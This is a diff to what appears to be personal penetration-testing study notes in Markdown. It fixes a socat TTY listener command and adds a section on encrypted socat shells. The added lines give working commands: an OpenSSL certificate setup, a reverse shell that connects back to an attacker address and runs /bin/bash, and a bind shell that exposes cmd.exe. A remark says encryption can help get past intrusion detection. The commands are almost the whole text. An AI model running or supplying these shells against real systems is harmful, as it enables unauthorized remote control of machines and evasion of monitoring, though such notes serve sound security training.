@@ -104,7 +104,7 @@ ___
 
 **More Stable Fully Interactive Reverse Shell on Linux**
 Target must have Socat installed --> upload [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
-1. Listener: `socat TCP-L:<port> FILE:`tty`,raw,echo=0`
+1. Listener: `socat TCP-L:<port> FILE:'tty',raw,echo=0`
 *Connect listening port and file, passing TTY in file and setting echo to 0 (similar to netcat `stty raw -echo; fg` trick*
 2. `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`: connect to listener
 	- `EXEC:"bash -li"`: create interactive bash session
@@ -118,11 +118,37 @@ ___
 ### Socat Encrypted Shells
 [[#Table of contents|Back to the top]]
 
+*Can't be spied on, can often bypass IDS*
 
+`TCP` is replaced with `openssl` when working with encrypted shells
+
+**Reverse Shell**
+
+1. Create **certificate** on attacking machine
+`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
+*Info about the certificate can be left blank / filled randomly*
+
+2. **Merge** key and certificate into .pem file
+`cat shell.key shell.crt > shell.pem`
+
+3. Reverse shell listener
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
+*`verify=0`: no verification of certificate authorities*
+
+4. Connect back
+`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
+
+**Bind Shell**
+Same 1. and 2. 
+3. Listener on target
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
+4. Connect
+`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`
 
 ___
-###
+### Common Shell Payloads
 [[#Table of contents|Back to the top]]
+
 
 
 ___
